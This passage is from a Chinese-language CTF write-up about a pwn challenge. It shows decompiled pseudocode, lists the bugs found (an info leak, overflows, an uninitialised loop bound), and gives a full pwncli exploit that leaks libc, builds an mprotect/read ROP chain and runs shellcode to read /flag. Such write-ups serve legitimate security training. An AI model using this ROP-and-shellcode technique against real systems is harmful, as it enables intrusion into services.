+</span></span><span class="line"><span class="cl">					<span class="n">a5</span> <span class="o">&lt;</span> <span class="n">a14</span> <span class="ow">and</span> <span class="n">a6</span> <span class="o">+</span> <span class="n">a7</span> <span class="o">&gt;</span> <span class="n">a8</span> <span class="o">+</span> <span class="n">a9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">						<span class="n">snprintf</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="mh">0xA</span><span class="n">uLL</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">)</span> <span class="n">buf2</span><span class="p">:</span> <span class="mh">0x63E0</span>
+</span></span><span class="line"><span class="cl">						<span class="k">return</span>
+</span></span><span class="line"><span class="cl">				<span class="n">sub_2CFB</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="n">show_ptr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="n">sub_2907</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sub_2514</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="sub_2cfb">sub_2CFB</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sub_2CFB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">res</span> <span class="o">=</span> <span class="n">snprintf</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="mh">0xA</span><span class="n">uLL</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">scanf</span><span class="p">(</span><span class="o">%</span><span class="n">d</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">puts</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="sub_2514">sub_2514</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sub_2514</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">a1</span> <span class="o">&gt;</span> <span class="n">a13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">a2</span> <span class="o">&gt;</span> <span class="n">a10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">a3</span> <span class="o">!=</span> <span class="n">a11</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">a5</span> <span class="o">&lt;</span> <span class="n">a14</span> <span class="ow">and</span> <span class="n">a6</span> <span class="o">+</span> <span class="n">a7</span> <span class="o">&gt;</span> <span class="n">a8</span> <span class="o">+</span> <span class="n">a9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">					<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">stack_var1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">						<span class="n">scanf</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%d</span><span class="s2">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">					<span class="k">return</span>
+</span></span><span class="line"><span class="cl">				<span class="n">sub_2514</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="n">show_ptr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="n">sub_2CFB</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sub_2907</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="sub_2f07">sub_2F07</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sub_20F7</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">a1</span> <span class="o">&gt;</span> <span class="n">a13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">a2</span> <span class="o">&gt;</span> <span class="n">a10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">a3</span> <span class="o">!=</span> <span class="n">a11</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">a4</span> <span class="o">&gt;</span> <span class="n">a12</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">					<span class="n">a5</span> <span class="o">&lt;</span> <span class="n">a14</span> <span class="ow">and</span> <span class="n">a6</span> <span class="o">+</span> <span class="n">a7</span> <span class="o">&gt;</span> <span class="n">a8</span> <span class="o">+</span> <span class="n">a9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">						<span class="n">res</span> <span class="o">=</span> <span class="n">snprintf</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="mh">0xA</span><span class="n">uLL</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">							<span class="n">scanf</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%d</span><span class="s2">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="k">return</span>
+</span></span><span class="line"><span class="cl">				<span class="n">sub_2CFB</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="n">show_ptr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="n">sub_2907</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sub_2514</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="漏洞点">漏洞点</h4>
+<p>目前发现的漏洞点有：</p>
+<ul>
+<li>
+<p><code>sub_2F1D</code>的那个<code>return</code>分支可以往<code>ptr</code>写内容，同时可以泄露<code>libc</code>地址</p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001548613.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001548613.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001548613.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001548613.png 2x" sizes="auto" data-title="image-20211223001548613" data-alt="image-20211223001548613" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</li>
+<li>
+<p><code>sub_2CFB</code>，可以溢出写<code>buf1</code>覆盖<code>ptr</code></p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001640142.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001640142.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001640142.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223001640142.png 2x" sizes="auto" data-title="image-20211223001640142" data-alt="image-20211223001640142" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</li>
+<li>
+<p><code>sub_2514</code>，<code>for</code>循环的边界是一个未初始化的变量：</p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222234309099.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222234309099.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222234309099.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222234309099.png 2x" sizes="auto" data-title="image-20211222234309099" data-alt="image-20211222234309099" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</li>
+<li>
+<p><code>sub_2F07</code>，漏洞就在于<code>snprintf</code>，最大的返回值可以是<code>0x200</code>，之后存在栈溢出，因为<code>4 * 0x200 &gt; 0x110</code>。</p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/2021-12-23_001013.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/2021-12-23_001013.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/2021-12-23_001013.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/2021-12-23_001013.png 2x" sizes="auto" data-title="2021-12-23_001013" data-alt="2021-12-23_001013" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</li>
+</ul>
+<h3 id="利用思路">利用思路</h3>
+<p>分析完主要函数的流程后，利用思路很清晰，主要分两步：</p>
+<ul>
+<li>利用<code>malloc</code>残留的指针泄露的地址，为了避免出现套娃情况，这里直接使用<code>sub_2F1D</code>函数打印信息后返回的那个分支</li>
+<li>利用<code>sub_2F07</code>中的栈溢出进行<code>ROP</code>，我这里使用<code>mprotect+shellcode</code>读取<code>flag</code></li>
+</ul>
+<h3 id="exp">EXP</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;libc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">assign_val</span><span class="p">(</span><span class="n">chunk_size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">arrays</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;hhh</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;size???</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="s2">&#34;Lucky Numbers</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arrays</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_array</span><span class="p">(</span><span class="o">*</span><span class="n">indexs</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">16</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indexs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">arr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_addr</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arr</span> <span class="o">=</span> <span class="n">get_array</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">assign_val</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">arr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;hhh</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">recv_libc_addr</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mh">0x1ebbe0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_libc_base_addr</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rop_attack</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arr</span> <span class="o">=</span> <span class="n">get_array</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">assign_val</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s2">&#34;deadbeef&#34;</span><span class="p">,</span> <span class="n">arr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;hhh</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;xmki</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x42</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x61616161</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x61616161</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x61616161</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="o">.</span><span class="n">mprotect</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">num</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="mh">0x42</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x61616161</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvregex</span><span class="p">(</span><span class="s2">&#34;flag{.*}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Get flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">error</span><span class="p">(</span><span class="s2">&#34;Cannot get flag!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak_addr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop_attack</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后远程打：</p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223213824409.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223213824409.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223213824409.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211223213824409.png 2x" sizes="auto" data-title="image-20211223213824409" data-alt="image-20211223213824409" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="引用与参考">引用与参考</h3>
+<p>1、<a href="https://roderickchan.github.io"target="_blank" rel="external nofollow noopener noreferrer">My Blog<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>2、<a href="https://ctf-wiki.org/"target="_blank" rel="external nofollow noopener noreferrer">Ctf Wiki<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
